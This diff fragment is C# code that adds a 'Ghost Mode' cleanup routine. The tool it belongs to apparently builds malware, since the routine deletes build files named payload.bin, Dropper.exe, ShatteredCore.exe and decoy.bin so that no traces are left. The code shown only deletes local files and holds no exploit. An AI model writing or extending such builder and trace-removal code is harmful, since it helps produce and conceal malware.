+        private void CleanupArtifacts(string batPath)
+        {
+            Log("[*] Ghost Mode: Scrubbing workspace artifacts...");
+            try
+            {
+                // 1. Delete temporary build directory
+                string buildDir = Path.Combine(_sourceDir, "build");
+                if (Directory.Exists(buildDir))
+                {
+                    try { 
+                        Directory.Delete(buildDir, true); 
+                        Log("[*] Build directory incinerated.");
+                    } catch { /* Handle locked state silently */ }
+                }
+
+                // 2. Define the target list for surgical removal
+                List<string> targets = new List<string> {
+                    Path.Combine(_sourceDir, "payload.bin"),
+                    Path.Combine(_sourceDir, "ShatteredCore.exe"),
+                    Path.Combine(_sourceDir, "Dropper.exe"),
+                    Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin"),
+                    batPath
+                };
+
+                // Add any loose .obj or .res files in the root
+                if (Directory.Exists(_sourceDir))
+                {
+                    targets.AddRange(Directory.GetFiles(_sourceDir, "*.obj"));
+                    targets.AddRange(Directory.GetFiles(_sourceDir, "*.res"));
+                }
+
+                // 3. Persistent deletion loop
+                foreach (var target in targets)
+                {
+                    if (string.IsNullOrEmpty(target)) continue;
+                    
+                    if (File.Exists(target))
+                    {
+                        try { 
+                            File.Delete(target); 
+                            Log($"[*] Detached artifact purged: {Path.GetFileName(target)}");
+                        } 
+                        catch (Exception ex) { 
+                            Log($"[!] Failed to purge {Path.GetFileName(target)}: {ex.Message}"); 
+                        }
+                    }
+                }
+
+                Log("[+] Total Ghost Mode: Workspace is 100% sterile.");
+            }
+            catch (Exception ex)
+            {
+                Log($"[!] Cleanup routine encountered an anomaly: {ex.Message}");
+            }
         }
 
         private string GenerateRandomString(int length)
